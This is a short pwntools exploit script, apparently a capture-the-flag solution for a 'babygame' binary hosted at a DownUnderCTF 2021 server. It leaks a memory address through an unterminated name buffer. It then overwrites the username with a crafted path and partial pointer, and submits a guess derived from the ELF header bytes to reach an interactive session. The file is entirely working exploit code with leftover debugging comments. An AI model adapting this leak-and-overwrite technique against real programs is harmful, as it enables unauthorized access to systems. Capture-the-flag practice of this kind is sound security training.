from pwn import *

BIN = "./babygame"
guess = b"\x7f\x45\x4c\x46" #0xfbad2488 #0x1e8c1e00000055de
Randpath = b"pwn"

def exploit():
	payload = b"a"*31
	io.recvuntil("Welcome, what is your name?")
	io.sendline(payload)
	io.recvuntil("> ")
	io.sendline(b"2")
	io.recvline()
	randadd = int.from_bytes(io.recvline().strip(), byteorder='little', signed=False)
	name = randadd - 32 + 0x209c
	print(hex(name))
	payload = Randpath + b"\x00"*(32-len(Randpath)) + p64(name)[0:6]
	# _breakpoint="""
	# 	b*set_username
	# 	"""
	# gdb.attach(io,_breakpoint)
	io.recvuntil("> ")
	io.sendline(b"1")
	io.recvuntil("What would you like to change your username to?")
	io.send(payload)
	io.recvuntil("> ")
	io.sendline(b"1337")
	io.recvuntil("guess: ")
	io.sendline("1179403647")
	io.interactive()

io = process(BIN)
io = remote("pwn-2021.duc.tf", 31907)
context.log_level="debug"
exploit()

#fread+156 0x5595288aa27b